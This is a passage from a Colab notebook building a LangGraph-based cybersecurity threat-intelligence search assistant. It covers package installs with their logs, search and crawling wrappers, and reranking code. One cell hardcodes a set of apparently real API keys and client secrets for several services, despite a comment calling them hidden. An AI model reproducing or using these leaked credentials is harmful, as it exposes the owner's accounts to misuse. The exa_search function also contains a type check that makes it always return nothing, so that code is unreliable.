{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/KaifAhmad1/code-test/blob/main/Langgraph_Agentic_RAG_Cyber_AI_Copilot.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### **Cyber AI Copilot for Security and Intelligence Domain**"
      ],
      "metadata": {
        "id": "M0rt8qzmxyyR"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 17,
      "metadata": {
        "id": "Wzih_tgLwXK6",
        "outputId": "96b9862d-34c6-400a-9a28-1dd36ab9572e",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[LOG] Welcome to the Crawl4AI Model Downloader!\n",
            "[LOG] This script will download all the models required for Crawl4AI.\n",
            "[LOG] Downloading text classifier...\n",
            "2024-12-14 10:27:00.207031: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:485] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered\n",
            "2024-12-14 10:27:00.245762: E external/local_xla/xla/stream_executor/cuda/cuda_dnn.cc:8454] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered\n",
            "2024-12-14 10:27:00.255878: E external/local_xla/xla/stream_executor/cuda/cuda_blas.cc:1452] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered\n",
            "2024-12-14 10:27:01.806361: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT\n",
            "INFO:numexpr.utils:NumExpr defaulting to 2 threads.\n",
            "[LOG] Text classifier loaded on cpu\n",
            "[LOG] Downloading custom NLTK Punkt model...\n",
            "[LOG] ✅ All models downloaded successfully.\n",
            "Playwright Host validation warning: \n",
            "╔══════════════════════════════════════════════════════╗\n",
            "║ Host system is missing dependencies to run browsers. ║\n",
            "║ Missing libraries:                                   ║\n",
            "║     libwoff2dec.so.1.0.2                             ║\n",
            "║     libgstgl-1.0.so.0                                ║\n",
            "║     libgstcodecparsers-1.0.so.0                      ║\n",
            "║     libavif.so.13                                    ║\n",
            "║     libharfbuzz-icu.so.0                             ║\n",
            "║     libenchant-2.so.2                                ║\n",
            "║     libsecret-1.so.0                                 ║\n",
            "║     libhyphen.so.0                                   ║\n",
            "║     libmanette-0.2.so.0                              ║\n",
            "╚══════════════════════════════════════════════════════╝\n",
            "    at validateDependenciesLinux (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/server/registry/dependencies.js:216:9)\n",
            "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)\n",
            "    at async Registry._validateHostRequirements (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/server/registry/index.js:753:43)\n",
            "    at async Registry._validateHostRequirementsForExecutableIfNeeded (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/server/registry/index.js:851:7)\n",
            "    at async Registry.validateHostRequirementsForExecutablesIfNeeded (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/server/registry/index.js:840:43)\n",
            "    at async t.<anonymous> (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/cli/program.js:137:7)\n",
            "++ arch\n",
            "+ [[ x86_64 == \\a\\a\\r\\c\\h\\6\\4 ]]\n",
            "+ '[' -z '' ']'\n",
            "+ [[ ! -f /etc/os-release ]]\n",
            "++ bash -c 'source /etc/os-release && echo $ID'\n",
            "+ ID=ubuntu\n",
            "+ [[ ubuntu != \\u\\b\\u\\n\\t\\u ]]\n",
            "+ dpkg --get-selections\n",
            "+ grep -q '^google-chrome[[:space:]]*install$'\n",
            "+ apt-get update\n",
            "Get:1 https://cloud.r-project.org/bin/linux/ubuntu jammy-cran40/ InRelease [3,626 B]\n",
            "Hit:2 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64  InRelease\n",
            "Get:3 http://security.ubuntu.com/ubuntu jammy-security InRelease [129 kB]\n",
            "Hit:4 http://archive.ubuntu.com/ubuntu jammy InRelease\n",
            "Get:5 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [128 kB]\n",
            "Get:6 https://r2u.stat.illinois.edu/ubuntu jammy InRelease [6,555 B]\n",
            "Hit:7 https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu jammy InRelease\n",
            "Get:8 https://r2u.stat.illinois.edu/ubuntu jammy/main all Packages [8,550 kB]\n",
            "Hit:9 https://ppa.launchpadcontent.net/graphics-drivers/ppa/ubuntu jammy InRelease\n",
            "Hit:10 https://ppa.launchpadcontent.net/ubuntugis/ppa/ubuntu jammy InRelease\n",
            "Get:11 http://security.ubuntu.com/ubuntu jammy-security/restricted amd64 Packages [3,364 kB]\n",
            "Get:12 http://archive.ubuntu.com/ubuntu jammy-backports InRelease [127 kB]\n",
            "Get:13 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 Packages [2,755 kB]\n",
            "Get:14 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 Packages [1,516 kB]\n",
            "Get:15 http://security.ubuntu.com/ubuntu jammy-security/universe amd64 Packages [1,226 kB]\n",
            "Get:16 http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages [2,469 kB]\n",
            "Get:17 https://r2u.stat.illinois.edu/ubuntu jammy/main amd64 Packages [2,636 kB]\n",
            "Fetched 22.9 MB in 4s (5,247 kB/s)\n",
            "Reading package lists... Done\n",
            "W: Skipping acquire of configured file 'main/source/Sources' as repository 'https://r2u.stat.illinois.edu/ubuntu jammy InRelease' does not seem to provide it (sources.list entry misspelt?)\n",
            "+ command -v curl\n",
            "+ cd /tmp\n",
            "+ curl -O https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\n",
            "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
            "                                 Dload  Upload   Total   Spent    Left  Speed\n",
            "100  107M  100  107M    0     0   153M      0 --:--:-- --:--:-- --:--:--  153M\n",
            "+ apt-get install -y ./google-chrome-stable_current_amd64.deb\n",
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "Note, selecting 'google-chrome-stable' instead of './google-chrome-stable_current_amd64.deb'\n",
            "The following additional packages will be installed:\n",
            "  libvulkan1 mesa-vulkan-drivers\n",
            "The following NEW packages will be installed:\n",
            "  google-chrome-stable libvulkan1 mesa-vulkan-drivers\n",
            "0 upgraded, 3 newly installed, 0 to remove and 50 not upgraded.\n",
            "Need to get 10.9 MB/123 MB of archives.\n",
            "After this operation, 417 MB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 libvulkan1 amd64 1.3.204.1-2 [128 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 mesa-vulkan-drivers amd64 23.2.1-1ubuntu3.1~22.04.3 [10.7 MB]\n",
            "Get:3 /tmp/google-chrome-stable_current_amd64.deb google-chrome-stable amd64 131.0.6778.139-1 [112 MB]\n",
            "Fetched 10.9 MB in 3s (3,921 kB/s)\n",
            "Selecting previously unselected package libvulkan1:amd64.\n",
            "(Reading database ... 123633 files and directories currently installed.)\n",
            "Preparing to unpack .../libvulkan1_1.3.204.1-2_amd64.deb ...\n",
            "Unpacking libvulkan1:amd64 (1.3.204.1-2) ...\n",
            "Selecting previously unselected package google-chrome-stable.\n",
            "Preparing to unpack .../google-chrome-stable_current_amd64.deb ...\n",
            "Unpacking google-chrome-stable (131.0.6778.139-1) ...\n",
            "Selecting previously unselected package mesa-vulkan-drivers:amd64.\n",
            "Preparing to unpack .../mesa-vulkan-drivers_23.2.1-1ubuntu3.1~22.04.3_amd64.deb ...\n",
            "Unpacking mesa-vulkan-drivers:amd64 (23.2.1-1ubuntu3.1~22.04.3) ...\n",
            "Setting up libvulkan1:amd64 (1.3.204.1-2) ...\n",
            "Setting up mesa-vulkan-drivers:amd64 (23.2.1-1ubuntu3.1~22.04.3) ...\n",
            "Setting up google-chrome-stable (131.0.6778.139-1) ...\n",
            "update-alternatives: using /usr/bin/google-chrome-stable to provide /usr/bin/x-www-browser (x-www-browser) in auto mode\n",
            "update-alternatives: using /usr/bin/google-chrome-stable to provide /usr/bin/gnome-www-browser (gnome-www-browser) in auto mode\n",
            "update-alternatives: using /usr/bin/google-chrome-stable to provide /usr/bin/google-chrome (google-chrome) in auto mode\n",
            "Processing triggers for man-db (2.10.2-1) ...\n",
            "Processing triggers for libc-bin (2.35-0ubuntu3.4) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/libumf.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtcm_debug.so.1 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libhwloc.so.15 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_0.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbb.so.12 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_5.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc_proxy.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtcm.so.1 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_adapter_level_zero.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_adapter_opencl.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_loader.so.0 is not a symbolic link\n",
            "\n",
            "+ rm -rf ./google-chrome-stable_current_amd64.deb\n",
            "+ cd -\n",
            "/usr/local/lib/python3.10/dist-packages/playwright/driver/package/bin\n",
            "+ google-chrome --version\n",
            "Google Chrome 131.0.6778.139 \n"
          ]
        }
      ],
      "source": [
        "!pip install --upgrade --quiet sentence-transformers langchain langchain-groq langchain-pinecone langchain_cohere\n",
        "!pip install --quiet -U \"langchain-community>=0.2.16\" langchain-exa langchain-google-community goose3 crawl4ai[all]\n",
        "!pip install --upgrade --quiet faiss-cpu langchain_cohere\n",
        "!pip install -qU langgraph\n",
        "!crawl4ai-download-models\n",
        "!playwright install\n",
        "!playwright install chrome"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "from typing import List, Dict, Any, Optional\n",
        "from pydantic import BaseModel\n",
        "from langchain_groq import ChatGroq\n",
        "from langchain_pinecone import PineconeVectorStore\n",
        "from pinecone import Pinecone\n",
        "from langchain_community.embeddings import HuggingFaceBgeEmbeddings\n",
        "from langchain.prompts import ChatPromptTemplate\n",
        "from langchain.chains import LLMChain\n",
        "from langchain_community.utilities import GoogleSerperAPIWrapper\n",
        "from langchain_community.tools import TavilySearchResults\n",
        "from langchain_google_community import GoogleSearchAPIWrapper\n",
        "from exa_py import Exa\n",
        "from dotenv import load_dotenv\n",
        "from langchain_core.tools import tool\n",
        "from datetime import datetime, timedelta\n",
        "import pytz\n",
        "from IPython.display import Image, display\n",
        "import getpass\n",
        "from langchain.schema import HumanMessage, SystemMessage, AIMessage\n",
        "import asyncio\n",
        "import nest_asyncio\n",
        "from crawl4ai import AsyncWebCrawler\n",
        "from crawl4ai.extraction_strategy import JsonCssExtractionStrategy\n",
        "import json\n",
        "from langchain_cohere import CohereRerank\n",
        "from langchain_community.llms import Cohere\n",
        "from langchain.retrievers.contextual_compression import ContextualCompressionRetriever\n",
        "from sklearn.metrics.pairwise import cosine_similarity\n",
        "import re\n",
        "from langgraph.graph import StateGraph, END\n",
        "from sentence_transformers import SentenceTransformer, util\n",
        "from transformers import pipeline\n",
        "import math\n",
        "\n",
        "# Apply nest_asyncio to allow nested event loops\n",
        "nest_asyncio.apply()\n",
        "\n",
        "# Load environment variables\n",
        "load_dotenv()\n",
        "\n",
        "# API Keys (hidden for security purposes)\n",
        "GROQ_API_KEY = getpass.getpass(\"Enter your Groq API key: \")\n",
        "PINECONE_API_KEY = \"8e15b925-3b96-497d-b20a-08d308782b83\"\n",
        "PINECONE_ENVIRONMENT = \"us-east-1\"\n",
        "ASKNEWS_CLIENT_ID = \"a0de4609-b760-4c83-9609-5c04d7743b84\"\n",
        "ASKNEWS_CLIENT_SECRET = \"D5Mlhkztk4TcW24diUgcW0FA2w\"\n",
        "SERPER_API_KEY = \"d8e815ef6caa94dbef7b977a0ea7d505b43a5a06\"\n",
        "EXA_API_KEY = \"953b5801-11be-4b37-a313-f8df8f37027c\"\n",
        "GOOGLE_API_KEY = \"AIzaSyBIQo9X6acoBazBfte9jF9Pl0QEZ9oe8pk\"\n",
        "GOOGLE_CSE_ID = \"63053004a7e2445c3\"\n",
        "TAVILY_API_KEY = \"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\"\n",
        "FIRECRAWL_API_KEY = \"fc-9c7bf92d1db44ae1a34f9dc56a6031e6\"\n",
        "COHERE_API_KEY = \"7e9js19mjC1pb3dNHKg012u6J9LRl8614KFL4ZmL\"\n",
        "\n",
        "# Set environment variables for Search Tools\n",
        "os.environ[\"GROQ_API_KEY\"] = GROQ_API_KEY\n",
        "os.environ[\"ASKNEWS_CLIENT_ID\"] = ASKNEWS_CLIENT_ID\n",
        "os.environ[\"ASKNEWS_CLIENT_SECRET\"] = ASKNEWS_CLIENT_SECRET\n",
        "os.environ[\"SERPER_API_KEY\"] = SERPER_API_KEY\n",
        "os.environ[\"EXA_API_KEY\"] = EXA_API_KEY\n",
        "os.environ[\"GOOGLE_API_KEY\"] = GOOGLE_API_KEY\n",
        "os.environ[\"GOOGLE_CSE_ID\"] = GOOGLE_CSE_ID\n",
        "os.environ[\"TAVILY_API_KEY\"] = TAVILY_API_KEY\n",
        "os.environ[\"FIRECRAWL_API_KEY\"] = FIRECRAWL_API_KEY\n",
        "os.environ[\"COHERE_API_KEY\"] = COHERE_API_KEY"
      ],
      "metadata": {
        "id": "FY2ZeXgvxMxp",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "90dd4442-3b11-4f13-a388-1f3d5eb32b55"
      },
      "execution_count": 18,
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Enter your Groq API key: ··········\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Initialize the Groq model\n",
        "llm = ChatGroq(\n",
        "    model=\"llama-3.2-3b-preview\",\n",
        "    temperature=0,\n",
        "    max_tokens=None,\n",
        "    timeout=None,\n",
        "    max_retries=2,\n",
        ")\n",
        "\n",
        "# Initialize the embeddings with advanced BGE model\n",
        "embeddings = HuggingFaceBgeEmbeddings(\n",
        "    model_name=\"BAAI/bge-large-en-v1.5\",\n",
        "    model_kwargs={\"device\": \"cpu\"},\n",
        "    encode_kwargs={\"normalize_embeddings\": True}\n",
        ")\n",
        "\n",
        "# Initialize Pinecone and vector store\n",
        "pc = Pinecone(api_key=PINECONE_API_KEY, environment=PINECONE_ENVIRONMENT)\n",
        "pinecone_index = pc.Index(\"new-cyber-search\")\n",
        "vector_store = PineconeVectorStore(index=pinecone_index, embedding=embeddings)\n",
        "\n",
        "# Initialize search tools\n",
        "google_serper = GoogleSerperAPIWrapper()\n",
        "tavily_search = TavilySearchResults(\n",
        "    max_results=5,\n",
        "    search_depth=\"advanced\",\n",
        "    include_answer=True,\n",
        "    include_raw_content=True,\n",
        "    include_images=True,\n",
        ")\n",
        "google_search = GoogleSearchAPIWrapper()\n",
        "exa = Exa(api_key=EXA_API_KEY)\n",
        "\n",
        "# Initialize Cohere Reranker\n",
        "compressor = CohereRerank(model=\"rerank-english-v3.0\")\n",
        "# Define the retriever\n",
        "retriever = vector_store.as_retriever()\n",
        "# Initialize ContextualCompressionRetriever\n",
        "compression_retriever = ContextualCompressionRetriever(\n",
        "    base_compressor=compressor, base_retriever=retriever\n",
        ")"
      ],
      "metadata": {
        "id": "XxTld11_xT0d"
      },
      "execution_count": 20,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from typing import TypedDict, List, Dict, Any, Optional\n",
        "from pydantic import BaseModel\n",
        "\n",
        "class AgentState(TypedDict):\n",
        "    messages: List[Dict[str, str]]\n",
        "    memory: Optional[Dict[str, Any]]\n",
        "\n",
        "class SearchResult(BaseModel):\n",
        "    source: str\n",
        "    title: str\n",
        "    snippet: str\n",
        "    url: str\n",
        "    date: Optional[str]\n",
        "    media: Optional[List[str]] = []\n",
        "    media_content: Optional[List[Dict[str, str]]] = []\n",
        "    links: Optional[List[str]] = []\n",
        "    source_weight: Optional[float] = None\n",
        "    source_name: Optional[str] = None\n",
        "    final_score: Optional[float] = None\n",
        "    metadata: Optional[Dict[str, Any]] = {}\n",
        "\n",
        "class SearchResponse(BaseModel):\n",
        "    results: List[SearchResult]\n",
        "\n",
        "def parse_date(date_str: Optional[str]) -> Optional[datetime]:\n",
        "    if not date_str:\n",
        "        return None\n",
        "    try:\n",
        "        return datetime.fromisoformat(date_str.replace('Z', '+00:00'))\n",
        "    except ValueError:\n",
        "        try:\n",
        "            return datetime.strptime(date_str, \"%Y-%m-%d\")\n",
        "        except ValueError:\n",
        "            return None"
      ],
      "metadata": {
        "id": "rnQiDPU8xddo"
      },
      "execution_count": 21,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def vector_search(query: str) -> List[SearchResult]:\n",
        "    results = vector_store.similarity_search(query, k=5)\n",
        "    return [\n",
        "        SearchResult(\n",
        "            source=\"Vector Search\",\n",
        "            title=f\"Result {i+1}\",\n",
        "            snippet=doc.page_content,\n",
        "            url=doc.metadata.get(\"source\", \"No URL\"),\n",
        "            date=doc.metadata.get(\"date\"),\n",
        "            metadata=doc.metadata\n",
        "        ) for i, doc in enumerate(results)\n",
        "    ]\n",
        "\n",
        "def google_serper_search(query: str) -> List[SearchResult]:\n",
        "    results = google_serper.results(query)\n",
        "    return [\n",
        "        SearchResult(\n",
        "            source=\"Google Serper\",\n",
        "            title=result.get(\"title\", \"No title\"),\n",
        "            snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "            url=result.get(\"link\", \"No link\"),\n",
        "            date=result.get(\"date\"),\n",
        "            metadata={\n",
        "                \"author\": result.get(\"author\"),\n",
        "                \"location\": result.get(\"location\")\n",
        "            }\n",
        "        ) for result in results.get(\"organic\", [])\n",
        "    ]\n",
        "\n",
        "@tool\n",
        "def search_and_contents(query: str):\n",
        "    \"\"\"Search for webpages based on the query and retrieve their contents.\"\"\"\n",
        "    return exa.search_and_contents(\n",
        "        query, use_autoprompt=True, num_results=5, text=True, highlights=True\n",
        "    )\n",
        "\n",
        "def exa_search(query: str) -> List[SearchResult]:\n",
        "    try:\n",
        "        print(f\"Starting Exa Search with query: {query}\")\n",
        "        response = search_and_contents(query)\n",
        "        print(f\"Raw results from Exa Search: {response}\")\n",
        "\n",
        "        if not isinstance(response, SearchResponse):\n",
        "            print(f\"Exa Search results are not a SearchResponse. Type: {type(response)}\")\n",
        "            return []\n",
        "\n",
        "        results = response.results  # Extract the list of results from the SearchResponse object\n",
        "\n",
        "        search_results = [\n",
        "            SearchResult(\n",
        "                source=\"Exa Search\",\n",
        "                title=result.get(\"title\", \"No title\"),\n",
        "                snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "                url=result.get(\"link\", \"No link\"),\n",
        "                date=result.get(\"date\"),\n",
        "                metadata={\n",
        "                    \"author\": result.get(\"author\"),\n",
        "                    \"location\": result.get(\"location\")\n",
        "                }\n",
        "            ) for result in results\n",
        "        ]\n",
        "\n",
        "        print(f\"Processed Exa Search results: {search_results}\")\n",
        "        return search_results\n",
        "    except Exception as e:\n",
        "        print(f\"ERROR in Exa Search: {str(e)}\")\n",
        "        return []\n",
        "\n",
        "# Tavily search tool\n",
        "tavily_tool = TavilySearchResults(\n",
        "    max_results=5,\n",
        "    search_depth=\"advanced\",\n",
        "    include_answer=True,\n",
        "    include_raw_content=True,\n",
        "    include_images=True,\n",
        ")\n",
        "\n",
        "def tavily_search(query: str) -> List[SearchResult]:\n",
        "    try:\n",
        "        results = tavily_tool.invoke({\"query\": query})\n",
        "        return [\n",
        "            SearchResult(\n",
        "                source=\"Tavily Search\",\n",
        "                title=result.get(\"title\", \"No title\"),\n",
        "                snippet=result.get(\"content\", \"No snippet\"),\n",
        "                url=result.get(\"url\", \"No link\"),\n",
        "                date=result.get(\"date\"),\n",
        "                metadata={\n",
        "                    \"author\": result.get(\"author\"),\n",
        "                    \"location\": result.get(\"location\")\n",
        "                }\n",
        "            ) for result in results\n",
        "        ]\n",
        "    except Exception as e:\n",
        "        print(f\"ERROR in Tavily Search: {str(e)}\")\n",
        "        return []\n",
        "\n",
        "# New Google Programmable Search function\n",
        "def google_programmable_search(query: str) -> List[SearchResult]:\n",
        "    try:\n",
        "        results = google_search.results(query, num_results=5)\n",
        "        return [\n",
        "            SearchResult(\n",
        "                source=\"Google Programmable Search\",\n",
        "                title=result.get(\"title\", \"No title\"),\n",
        "                snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "                url=result.get(\"link\", \"No link\"),\n",
        "                date=result.get(\"date\"),\n",
        "                metadata={\n",
        "                    \"author\": result.get(\"author\"),\n",
        "                    \"location\": result.get(\"location\")\n",
        "                }\n",
        "            ) for result in results\n",
        "        ]\n",
        "    except Exception as e:\n",
        "        print(f\"ERROR in Google Programmable Search: {str(e)}\")\n",
        "        return []\n",
        "\n",
        "# Google Serper Image Search\n",
        "def google_serper_image_search(query: str) -> List[SearchResult]:\n",
        "    search_images = GoogleSerperAPIWrapper(type=\"images\")\n",
        "    results_images = search_images.results(query)\n",
        "    return [\n",
        "        SearchResult(\n",
        "            source=\"Google Serper Image Search\",\n",
        "            title=result.get(\"title\", \"No title\"),\n",
        "            snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "            url=result.get(\"imageUrl\", \"No link\"),\n",
        "            date=None,\n",
        "            media=[result.get(\"imageUrl\", \"No link\")]\n",
        "        ) for result in results_images.get(\"images\", [])\n",
        "    ]\n",
        "\n",
        "# Google Programmable Image Search\n",
        "def google_programmable_image_search(query: str) -> List[SearchResult]:\n",
        "    try:\n",
        "        results = google_search.results(query + \" image\", num_results=5)\n",
        "        return [\n",
        "            SearchResult(\n",
        "                source=\"Google Programmable Image Search\",\n",
        "                title=result.get(\"title\", \"No title\"),\n",
        "                snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "                url=result.get(\"link\", \"No link\"),\n",
        "                date=None,\n",
        "                media=[result.get(\"link\", \"No link\")]\n",
        "            ) for result in results\n",
        "        ]\n",
        "    except Exception as e:\n",
        "        print(f\"ERROR in Google Programmable Image Search: {str(e)}\")\n",
        "        return []\n",
        "\n",
        "# Enhanced recency scoring using exponential decay\n",
        "def calculate_recency_score(date: Optional[datetime]) -> float:\n",
        "    if date is None:\n",
        "        return 0.0\n",
        "    current_date = datetime.now(pytz.utc)\n",
        "    days_old = (current_date - date).days\n",
        "    if days_old < 0:  # Future date\n",
        "        return 0.0\n",
        "    return 0.9 ** days_old  # Exponential decay with base 0.9\n",
        "\n",
        "# Enhanced source classification\n",
        "def classify_source(source: str) -> float:\n",
        "    if \"advisory\" in source.lower() or \"threat intelligence\" in source.lower():\n",
        "        return 1.0  # Highest weight for official security advisories and threat intelligence platforms\n",
        "    elif \"news\" in source.lower():\n",
        "        return 0.8  # High weight for news sources\n",
        "    elif \"blog\" in source.lower():\n",
        "        return 0.6  # Moderate weight for blogs\n",
        "    else:\n",
        "        return 0.5  # Default weight for other sources\n",
        "\n",
        "# Enhanced search query\n",
        "def enhance_search_query(query: str) -> str:\n",
        "    current_year = datetime.now().year\n",
        "    enhanced_query = f\"{query} 2024 OR {current_year} recent cybersecurity incidents data breaches malware attacks threat intelligence reports\"\n",
        "\n",
        "    # Query expansion with related terms\n",
        "    related_terms = get_related_terms(query)\n",
        "    if related_terms:\n",
        "        enhanced_query += f\" related_terms:{', '.join(related_terms)}\"\n",
        "\n",
        "    return enhanced_query\n",
        "\n",
        "def get_related_terms(query: str) -> List[str]:\n",
        "    # Use an ontology or knowledge graph to identify related concepts and terms\n",
        "    related_terms = {\n",
        "        \"cyber attack\": [\"hacking\", \"data breach\", \"malware\", \"ransomware\"],\n",
        "        \"threat actor\": [\"cyber gang\", \"hacker group\", \"APT\"],\n",
        "        \"vulnerability\": [\"exploit\", \"CVE\", \"security flaw\"],\n",
        "        \"phishing\": [\"spear phishing\", \"email scam\", \"social engineering\"],\n",
        "        # Add more related terms as needed\n",
        "    }\n",
        "\n",
        "    # Find related terms for the query\n",
        "    query_terms = query.lower().split()\n",
        "    found_terms = []\n",
        "    for term in query_terms:\n",
        "        if term in related_terms:\n",
        "            found_terms.extend(related_terms[term])\n",
        "\n",
        "    return found_terms\n",
        "\n",
        "# Reranking function with semantic similarity and metadata scoring\n",
        "def rerank_results(query: str, results: List[SearchResult], state: AgentState) -> List[SearchResult]:\n",
        "    # Create embeddings for query and results\n",
        "    query_embedding = embeddings.embed_query(query)\n",
        "\n",
        "    # Combine snippets with crawled content for richer context\n",
        "    enhanced_results = []\n",
        "    for result in results:\n",
        "        # Get crawled content for this URL if available\n",
        "        crawled_content = \"\"\n",
        "        for m in state[\"messages\"]:\n",
        "            if m[\"role\"] == \"tool\" and \"crawled_results\" in m:\n",
        "                for cr in m[\"crawled_results\"]:\n",
        "                    if isinstance(cr, dict) and cr.get(\"url\") == result.url:\n",
        "                        crawled_content = cr.get(\"content\", \"\")\n",
        "                        break\n",
        "\n",
        "        # Combine snippet with crawled content\n",
        "        full_content = f\"{result.snippet}\\n{crawled_content}\"\n",
        "        content_embedding = embeddings.embed_query(full_content)\n",
        "\n",
        "        # Calculate semantic similarity\n",
        "        similarity = cosine_similarity(\n",
        "            [query_embedding],\n",
        "            [content_embedding]\n",
        "        )[0][0]\n",
        "\n",
        "        # Add metadata scoring (e.g., source weight, date)\n",
        "        metadata_score = result.source_weight or 0\n",
        "        date = parse_date(result.date)\n",
        "        date_score = calculate_recency_score(date)\n",
        "        final_score = similarity + metadata_score + date_score\n",
        "\n",
        "        enhanced_results.append((final_score, result))\n",
        "\n",
        "    # Sort by final score\n",
        "    enhanced_results.sort(reverse=True, key=lambda x: x[0])\n",
        "    return [result for _, result in enhanced_results]\n",
        "\n",
        "# Enhanced content extraction with media handling\n",
        "async def extract_content_from_url(url: str) -> Dict[str, Any]:\n",
        "    schema = {\n",
        "        \"name\": \"Enhanced Content Extractor\",\n",
        "        \"baseSelector\": \"body\",\n",
        "        \"fields\": [\n",
        "            {\n",
        "                \"name\": \"content\",\n",
        "                \"selector\": \"body\",\n",
        "                \"type\": \"text\",\n",
        "            },\n",
        "            {\n",
        "                \"name\": \"links\",\n",
        "                \"selector\": \"a[href]\",\n",
        "                \"type\": \"attribute\",\n",
        "                \"attribute\": \"href\",\n",
        "            },\n",
        "            {\n",
        "                \"name\": \"images\",\n",
        "                \"selector\": \"img[src]\",\n",
        "                \"type\": \"attribute\",\n",
        "                \"attribute\": \"src\",\n",
        "            },\n",
        "            {\n",
        "                \"name\": \"meta_description\",\n",
        "                \"selector\": \"meta[name='description']\",\n",
        "                \"type\": \"attribute\",\n",
        "                \"attribute\": \"content\",\n",
        "            },\n",
        "            {\n",
        "                \"name\": \"publication_date\",\n",
        "                \"selector\": [\n",
        "                    \"meta[property='article:published_time']\",\n",
        "                    \"time[datetime]\",\n",
        "                    \"meta[name='publicationDate']\"\n",
        "                ],\n",
        "                \"type\": \"attribute\",\n",
        "                \"attribute\": [\"content\", \"datetime\", \"content\"],\n",
        "            }\n",
        "        ],\n",
        "    }\n",
        "\n",
        "    extraction_strategy = JsonCssExtractionStrategy(schema, verbose=True)\n",
        "\n",
        "    async with AsyncWebCrawler(verbose=True) as crawler:\n",
        "        result = await crawler.arun(\n",
        "            url=url,\n",
        "            extraction_strategy=extraction_strategy,\n",
        "            bypass_cache=True,\n",
        "        )\n",
        "\n",
        "        if not result.success:\n",
        "            print(f\"ERROR: Failed to crawl the page {url}\")\n",
        "            return None\n",
        "\n",
        "        extracted_content = json.loads(result.extracted_content)\n",
        "\n",
        "        # Process and validate images\n",
        "        if \"images\" in extracted_content:\n",
        "            valid_images = []\n",
        "            for img_url in extracted_content[\"images\"]:\n",
        "                if is_valid_image_url(img_url):\n",
        "                    valid_images.append(img_url)\n",
        "            extracted_content[\"valid_images\"] = valid_images\n",
        "\n",
        "        return extracted_content\n",
        "\n",
        "def is_valid_image_url(url: str) -> bool:\n",
        "    \"\"\"Validate image URLs and filter out common web elements.\"\"\"\n",
        "    if not url:\n",
        "        return False\n",
        "\n",
        "    # Filter out common web elements\n",
        "    excluded_patterns = [\n",
        "        'favicon', 'logo', 'icon', 'sprite', 'pixel',\n",
        "        'tracking', 'advertisement', 'banner'\n",
        "    ]\n",
        "    return not any(pattern in url.lower() for pattern in excluded_patterns)\n",
        "\n",
        "# Enhanced search aggregation with deduplication and metadata scoring\n",
        "def aggregate_search_results(\n",
        "    query: str,\n",
        "    *args: List[SearchResult]\n",
        ") -> List[SearchResult]:\n",
        "\n",
